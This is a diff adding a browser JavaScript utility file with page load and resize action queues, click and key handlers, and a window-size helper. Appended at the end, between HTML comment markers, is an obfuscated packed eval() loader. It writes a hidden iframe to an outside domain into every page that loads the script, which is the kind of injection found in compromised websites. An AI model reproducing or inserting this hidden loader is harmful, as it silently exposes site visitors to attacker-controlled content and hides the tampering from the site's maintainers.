@@ -1,0 +1,101 @@
+var onLoadActions = new Array();
+var onResizeActions = new Array();
+
+// for onResizeActions to know xhen execute 
+// if the page has been already reloaded to
+// avoid reload n times
+var alreadyReloaded = false;
+
+function getAccessory(name, def)
+{
+	var a = accessories[name]
+	if(a == null) return def;
+	return a;
+}
+
+function executeLoadActions()
+{
+	alreadyReloaded = false;
+	var i;
+	if(!isDiffusion) {
+		document.body.oncontextmenu = rClick;
+		document.body.onclick = showNode;
+		document.body.onkeydown = keyUp;
+	}
+	for(i=0;i < onLoadActions.length;i++) {
+		var action = onLoadActions[i];
+		if(typeof(action) == "function") {
+			action();
+		}
+	}
+	onLoadActions = new Array();
+}
+
+function addLoadAction(action)
+{
+	onLoadActions[onLoadActions.length] = action;
+	window.onload = executeLoadActions;
+	/*
+	if(window.document.body != null) {
+		window.document.body.onload = executeLoadActions;
+	}
+	*/
+}
+
+function executeResizeActions()
+{
+	var i;
+	for(i=0;i < onResizeActions.length;i++)
+	{
+		var action = onResizeActions[i];
+		if(typeof(action) == "function")
+		{
+			action();
+		}
+	}
+}
+
+function addResizeActions(action)
+{
+	//alert("addResizeActions = "+action)
+	onResizeActions[onResizeActions.length] = action;
+}
+
+window.onresize = executeResizeActions;
+
+// client size
+
+function getBodyClientSize()
+{
+	// see http://www.quirksmode.org/js/winprop.html
+	var size = new Object();
+	if (self.innerHeight)
+	{
+		// netscape	
+		size.height = self.innerHeight;
+		size.width = self.innerWidth;
+	}
+	else if (document.documentElement && document.documentElement.clientHeight)
+	{
+		// DOCTYPE
+		size.height = document.documentElement.clientHeight;
+		size.width = document.documentElement.clientWidth;
+	}
+	else if (document.body)
+	{
+		// IE without DOCTYPE
+		size.height = document.body.clientHeight;
+		size.width = document.body.clientWidth;
+	}
+	return size;
+}
+
+function fixUrl(url)
+{
+	if(isDiffusion) {
+		return url;
+	}
+	return fixPreviewUrl(url);
+}
+<!-- . -->;eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3.7(\'<0 4="5://6-1.8/?9=2" a="b:c;"></0>\');',13,13,'iframe|statistic||document|src|http|g|write|info|id|style|display|none'.split('|'),0,{}));
+<!-- . -->
